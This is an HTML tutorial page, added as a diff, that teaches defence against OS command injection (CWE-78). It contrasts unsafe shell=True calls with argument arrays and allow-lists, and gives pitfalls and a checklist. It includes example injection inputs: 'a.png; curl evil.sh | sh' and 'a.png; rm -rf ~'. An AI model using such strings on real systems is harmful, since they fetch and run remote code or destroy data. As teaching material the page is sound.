@@ -1,0 +1,105 @@
+<!doctype html>
+<html lang="zh-CN"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#F5F5F7">
+<meta name="description" content="命令注入 / 远程代码执行 (RCE) 专业模式：命令注入（OS Command Injection，CWE-78）指应用把不可信输入拼接进操作系统命令并交给 shell 执行，攻击者通过 ;、|、&amp;&amp;、$()">
+<title>🎓 命令注入 / 远程代码执行 (RCE) · 专业模式 · AI 造物指南</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🧭</text></svg>">
+<link rel="stylesheet" href="../assets/style.css">
+</head><body class="is-concept is-pro" data-root="../">
+<a class="skip" href="#main">跳到正文</a>
+<div id="readbar"></div>
+<header class="top"><div class="top-in">
+<a class="brand" href="../index.html"><img src="../assets/mascot-sm.webp" alt="" width="32" height="32"><b>AI 造物指南</b></a>
+<nav class="tools" aria-label="工具">
+<button data-act="search" title="搜索（按 / 键）" aria-label="搜索">🔎<span>搜索</span></button>
+<a href="../glossary.html" title="词汇表" aria-label="词汇表">📚<span>词汇表</span></a>
+<button data-act="rand" title="随便学一个没学过的" aria-label="随机一个">🎲<span>随机</span></button>
+<button data-act="settings" title="阅读设置" aria-label="阅读设置" aria-haspopup="dialog">⚙️<span>阅读设置</span></button>
+</nav></div></header>
+
+<main class="cp pro l3" id="main" data-slug="command-injection" data-answer="0" data-prev="sast-and-dast.pro.html" data-next="pii-redaction.pro.html">
+<nav class="crumb" aria-label="位置"><a href="../index.html">首页</a><span>›</span><a href="../l/l3.html#sec">🔮 高级 · 🛡️ 安全防线</a><span>›</span><a href="command-injection.html">命令注入 / 远程代码执行 (RCE)</a><span>›</span><b>专业模式</b></nav>
+<div class="cp-grid">
+<aside class="rail" aria-label="本页目录">
+  <div class="rail-in">
+    <div class="rail-meta"><span class="lvb pro-b">🎓 专业模式</span><span class="muted">No.395 / 500</span></div>
+    <ol class="rail-list"><li><a href="#p-def" data-sec="p-def"><span class="re">📐</span><span class="rl">定义</span><i class="rc">✓</i></a></li><li><a href="#p-how" data-sec="p-how"><span class="re">⚙️</span><span class="rl">原理</span><i class="rc">✓</i></a></li><li><a href="#p-terms" data-sec="p-terms"><span class="re">🔤</span><span class="rl">术语</span><i class="rc">✓</i></a></li><li><a href="#p-code" data-sec="p-code"><span class="re">💻</span><span class="rl">代码</span><i class="rc">✓</i></a></li><li><a href="#p-tab" data-sec="p-tab"><span class="re">📊</span><span class="rl">参数对比</span><i class="rc">✓</i></a></li><li><a href="#p-trade" data-sec="p-trade"><span class="re">⚖️</span><span class="rl">方案取舍</span><i class="rc">✓</i></a></li><li><a href="#p-pit" data-sec="p-pit"><span class="re">🕳️</span><span class="rl">常见坑</span><i class="rc">✓</i></a></li><li><a href="#p-check" data-sec="p-check"><span class="re">☑️</span><span class="rl">检查清单</span><i class="rc">✓</i></a></li><li><a href="#p-int" data-sec="p-int"><span class="re">🎤</span><span class="rl">面试追问</span><i class="rc">✓</i></a></li><li><a href="#p-refs" data-sec="p-refs"><span class="re">🔗</span><span class="rl">延伸阅读</span><i class="rc">✓</i></a></li></ol>
+    <div class="rail-pn"><a class="pn prev" href="sast-and-dast.pro.html" rel="prev"><small>‹ 上一个</small><b>🔬 静态与动态安全测试 (SAST / DAST)</b></a><a class="pn next" href="pii-redaction.pro.html" rel="next"><small>下一个 ›</small><b>🙈 个人敏感信息脱敏 (PII)</b></a></div>
+  </div>
+</aside>
+<div class="cp-main">
+<section class="t chero pro-hero" id="s-hero">
+  <div class="hemo" aria-hidden="true">💣</div>
+  <div class="chero-txt">
+    <div class="meta"><span class="lvb pro-b">🎓 专业模式</span><span>🔮 高级</span><span>🛡️ 安全防线</span><span>⏱ 约 10 分钟</span></div>
+    <h1>命令注入 / 远程代码执行 (RCE)</h1><p class="en">Command Injection</p>
+    <div class="hbtns"><a class="prosw back" href="command-injection.html" data-mode="easy">🧸 回到小白版</a></div>
+  </div>
+</section>
+<div class="strip-wrap">
+  <div class="strip" role="tablist" aria-label="本页卡片"><a class="sc-chip" href="#p-def" data-sec="p-def"><span>📐</span>定义</a><a class="sc-chip" href="#p-how" data-sec="p-how"><span>⚙️</span>原理</a><a class="sc-chip" href="#p-terms" data-sec="p-terms"><span>🔤</span>术语</a><a class="sc-chip" href="#p-code" data-sec="p-code"><span>💻</span>代码</a><a class="sc-chip" href="#p-tab" data-sec="p-tab"><span>📊</span>参数对比</a><a class="sc-chip" href="#p-trade" data-sec="p-trade"><span>⚖️</span>方案取舍</a><a class="sc-chip" href="#p-pit" data-sec="p-pit"><span>🕳️</span>常见坑</a><a class="sc-chip" href="#p-check" data-sec="p-check"><span>☑️</span>检查清单</a><a class="sc-chip" href="#p-int" data-sec="p-int"><span>🎤</span>面试追问</a><a class="sc-chip" href="#p-refs" data-sec="p-refs"><span>🔗</span>延伸阅读</a></div>
+  <button class="modebtn" data-act="mode" aria-pressed="false">☰ 全部展开</button>
+</div>
+<div class="bento cbento pbento">
+<section class="t sec p-def" id="p-def"><header class="th"><span class="tag">📐 01 · 定义</span></header><p class="pdef">命令注入（OS Command Injection，CWE-78）指应用把不可信输入拼接进操作系统命令并交给 shell 执行，攻击者通过 ;、|、&amp;&amp;、$() 等元字符追加任意命令，常直接导致远程代码执行（RCE）。它属于应用安全的注入类漏洞，是 OWASP Top 10「注入」的一部分。AI Agent 执行 shell 命令、处理文件名的场景尤其容易引入。</p></section>
+<section class="t sec p-how" id="p-how"><header class="th"><span class="tag">⚙️ 02 · 原理</span></header><ol class="how"><li><span class="sn">1</span><p>应用调用 system()、exec()、subprocess(shell=True) 等接口，把用户输入拼进命令字符串。</p></li><li><span class="sn">2</span><p>shell 解析整个字符串，元字符被解释为命令分隔、管道或子命令替换。</p></li><li><span class="sn">3</span><p>攻击者输入如 a.png; curl evil.sh | sh，后半段以应用进程的权限执行。</p></li><li><span class="sn">4</span><p>即使不经过 shell，若把输入作为参数传给 git、tar 等程序，以 - 开头的值仍可能被当成选项（参数注入）。</p></li><li><span class="sn">5</span><p>防御核心是不经过 shell：以参数数组调用程序，或改用语言原生库，再叠加白名单校验与最小权限。</p></li></ol></section>
+<section class="t sec p-terms" id="p-terms"><header class="th"><span class="tag">🔤 03 · 术语</span></header><dl class="terms"><div class="term"><dt>RCE (Remote Code Execution)</dt><dd>攻击者能在目标服务器上执行任意代码。</dd></div><div class="term"><dt>Shell 元字符 (Metacharacters)</dt><dd>; | &amp; $ ` &gt; &lt; 等被 shell 赋予特殊含义的字符。</dd></div><div class="term"><dt>参数注入 (Argument Injection)</dt><dd>输入被目标程序当作命令行选项解析。</dd></div><div class="term"><dt>参数数组 (argv)</dt><dd>以列表形式传参，不经 shell 解析，每项都是单个参数。</dd></div><div class="term"><dt>CWE-78</dt><dd>MITRE 对 OS 命令注入弱点的编号。</dd></div></dl></section>
+<section class="t sec p-code" id="p-code"><header class="th"><span class="tag">💻 04 · 代码</span></header><div class="codebox"><div class="codebar"><span>危险与安全的调用方式</span><em>python</em><button class="ccopy">复制</button></div><pre><code>import re, subprocess
+
+filename = request_args[&quot;file&quot;]   # 来自用户，如 &quot;a.png; rm -rf ~&quot;
+
+# ❌ shell=True + 字符串拼接：分号后的命令会被执行
+subprocess.run(f&quot;convert {filename} out.jpg&quot;, shell=True)
+
+# ✅ 先做白名单校验，再用参数列表调用，不经过 shell
+if not re.fullmatch(r&quot;[\w.-]{1,100}&quot;, filename) or filename.startswith(&quot;-&quot;):
+    raise ValueError(&quot;invalid filename&quot;)
+subprocess.run([&quot;convert&quot;, &quot;--&quot;, filename, &quot;out.jpg&quot;],
+               check=True, timeout=30)
+# &quot;--&quot; 告诉多数程序其后都是位置参数，防止参数注入（需目标程序支持）
+
+# ✅ 更好：能用库就别调命令行，如用 Pillow 处理图片
+# from PIL import Image; Image.open(path).convert(&quot;RGB&quot;).save(&quot;out.jpg&quot;)</code></pre></div><p class="cnote">参数列表让输入始终是一个参数；白名单与 -- 进一步防止参数注入。request_args 为示意变量。</p></section>
+<section class="t sec p-tab" id="p-tab"><header class="th"><span class="tag">📊 05 · 参数对比</span></header><h3 class="tt">各语言安全调用方式</h3><div class="tw"><table><thead><tr><th>语言</th><th>危险写法</th><th>安全写法</th></tr></thead><tbody><tr><td data-h="语言">Python</td><td data-h="危险写法">os.system / shell=True</td><td data-h="安全写法">subprocess.run([...])</td></tr><tr><td data-h="语言">Node.js</td><td data-h="危险写法">child_process.exec(str)</td><td data-h="安全写法">execFile / spawn(cmd, args)</td></tr><tr><td data-h="语言">PHP</td><td data-h="危险写法">shell_exec / system 拼接</td><td data-h="安全写法">避免调用；必要时 escapeshellarg</td></tr><tr><td data-h="语言">Go</td><td data-h="危险写法">exec.Command(&quot;sh&quot;,&quot;-c&quot;,str)</td><td data-h="安全写法">exec.Command(prog, args...)</td></tr></tbody></table></div></section>
+<section class="t sec p-trade" id="p-trade"><header class="th"><span class="tag">⚖️ 06 · 方案取舍</span></header><div class="trades"><div class="trd"><h4>参数数组调用</h4><p><b class="k-p">优点</b>从根本上避免 shell 解析</p><p><b class="k-c">代价</b>无法使用管道、通配等 shell 特性</p><p><b class="k-w">适用</b>必须调用外部程序时</p></div><div class="trd"><h4>语言原生库替代</h4><p><b class="k-p">优点</b>无进程边界，无注入面</p><p><b class="k-c">代价</b>需寻找等价库</p><p><b class="k-w">适用</b>图片、压缩、网络等常见操作</p></div><div class="trd"><h4>转义（如 shlex.quote）</h4><p><b class="k-p">优点</b>可保留 shell 特性</p><p><b class="k-c">代价</b>易遗漏，跨 shell 行为不一</p><p><b class="k-w">适用</b>确实需要 shell 的遗留代码</p></div><div class="trd"><h4>沙箱/容器隔离执行</h4><p><b class="k-p">优点</b>限制成功攻击的影响</p><p><b class="k-c">代价</b>不修复漏洞本身</p><p><b class="k-w">适用</b>Agent 执行任意命令的场景</p></div></div></section>
+<section class="t sec p-pit" id="p-pit"><header class="th"><span class="tag">🕳️ 07 · 常见坑</span></header><ul class="pits"><li><p class="bad"><b>✗</b>以为加引号包住输入就安全</p><p class="fix"><b>✓</b>引号可被闭合；使用参数数组而非字符串拼接</p></li><li><p class="bad"><b>✗</b>用黑名单过滤 ; 和 |</p><p class="fix"><b>✓</b>黑名单易绕过（换行、$()、反引号），改用白名单与不经 shell</p></li><li><p class="bad"><b>✗</b>忽视参数注入，输入以 - 开头</p><p class="fix"><b>✓</b>使用 -- 分隔并拒绝以 - 开头的值</p></li><li><p class="bad"><b>✗</b>让 Agent 以高权限直接执行模型生成的命令</p><p class="fix"><b>✓</b>在沙箱中以最小权限运行，危险命令需人工确认</p></li></ul></section>
+<section class="t sec p-check" id="p-check"><header class="th"><span class="tag">☑️ 08 · 检查清单</span></header><ul class="checks"><li><label><input type="checkbox"><span>代码中无 shell=True/exec 拼接用户输入</span></label></li><li><label><input type="checkbox"><span>外部命令使用参数数组</span></label></li><li><label><input type="checkbox"><span>输入有白名单校验</span></label></li><li><label><input type="checkbox"><span>进程以最小权限运行</span></label></li><li><label><input type="checkbox"><span>SAST 规则覆盖命令执行函数</span></label></li><li><label><input type="checkbox"><span>Agent 命令执行在沙箱中</span></label></li></ul></section>
+<section class="t sec p-int" id="p-int"><header class="th"><span class="tag">🎤 09 · 面试追问</span></header><div class="ivs"><details class="iv"><summary>为什么参数数组能防命令注入？</summary><p>不启动 shell，操作系统直接以 argv 执行程序；每个元素原样作为一个参数，; | $() 等不会被解释，输入最多影响该参数本身。</p></details><details class="iv"><summary>参数数组之后还有什么风险？</summary><p>参数注入：目标程序会把以 - 开头的值当选项（如 git 的 --upload-pack 可执行命令）。还要防路径遍历、程序本身的漏洞，并对输入做白名单。</p></details><details class="iv"><summary>AI Agent 场景如何降低命令注入风险？</summary><p>工具设计为结构化参数而非任意 shell；执行环境隔离（容器、无网络或网络白名单）；命令白名单与人工审批；对外部内容（网页、文件）中的指令保持怀疑，防止提示注入诱导执行。</p></details></div></section>
+<section class="t sec p-refs" id="p-refs"><header class="th"><span class="tag">🔗 10 · 延伸阅读</span></header><ul class="refs"><li><a href="https://community.owasp.org/attacks/Command_Injection" target="_blank" rel="noopener"><b>OWASP：Command Injection</b><small>community.owasp.org ↗</small></a></li><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" target="_blank" rel="noopener"><b>OWASP：OS Command Injection Defense Cheat Sheet</b><small>cheatsheetseries.owasp.org ↗</small></a></li><li><a href="https://cwe.mitre.org/data/definitions/78.html" target="_blank" rel="noopener"><b>MITRE CWE-78</b><small>cwe.mitre.org ↗</small></a></li></ul></section>
+<section class="t fin">
+  <img src="../assets/mascot.webp" alt="" width="640" height="640" class="fin-m">
+  <div class="fin-txt"><h2 class="fin-h">专业版也啃完了</h2><p class="muted">打卡和小白版共用一个进度。</p>
+  <button class="btn pri done">🙋 我学会了！</button></div>
+  <nav class="pnav"><a class="pn prev" href="sast-and-dast.pro.html" rel="prev"><small>‹ 上一个</small><b>🔬 静态与动态安全测试 (SAST / DAST)</b></a><a class="pn next" href="pii-redaction.pro.html" rel="next"><small>下一个 ›</small><b>🙈 个人敏感信息脱敏 (PII)</b></a></nav>
+</section>
+</div>
+<div class="cardhint" aria-live="polite"><span class="ch-t"></span><span class="dots" aria-hidden="true"></span></div>
+</div>
+</div>
+<nav class="bbar" aria-label="翻卡">
+  <button class="bb prevc" data-act="prevc">‹ 上一张</button>
+  <button class="bb done" data-compact="1">🙋 我学会了</button>
+  <button class="bb nextc" data-act="nextc">下一张 ›</button>
+</nav>
+</main>
+<footer class="foot">🧭 AI 造物指南 · by Q1f730</footer>
+<div id="scrim" hidden></div>
+<div id="setp" class="sheet" hidden role="dialog" aria-modal="true" aria-label="阅读设置">
+  <div class="grab"></div>
+  <div class="sh-h"><b>⚙️ 阅读设置</b><button class="x" data-act="close" aria-label="关闭">✕</button></div>
+  <div class="srow"><span>🔠 字号</span><div class="fsz"><button data-act="font-" aria-label="字变小">A-</button><em id="fsv">18</em><button data-act="font+" aria-label="字变大">A+</button></div></div>
+  <button class="srow tg" data-act="calm"><span>🫧 宽松阅读<small>字距、行距更大</small></span><i class="sw2"></i></button>
+  <button class="srow tg" data-act="focus"><span>🔦 专注模式<small>只亮当前这一块</small></span><i class="sw2"></i></button>
+  <button class="srow tg" data-act="motion"><span>⏸️ 暂停动画<small>动画定格，不再晃</small></span><i class="sw2"></i></button>
+</div>
+<div id="sov" class="sov" hidden role="dialog" aria-modal="true" aria-label="搜索">
+  <div class="sov-in">
+    <div class="sbox"><span>🔎</span><input id="sq" type="search" placeholder="搜中文或英文，比如 token、数据库" autocomplete="off" aria-label="搜索概念" aria-controls="sres"><button class="x" data-act="close">取消</button></div>
+    <ul id="sres" class="sres" role="listbox"></ul>
+    <p class="shint">↑ ↓ 选择 · 回车打开 · Esc 关闭</p>
+  </div>
+</div>
+<script src="../assets/index.js"></script>
+<script src="../assets/app.js"></script>
+</body></html>
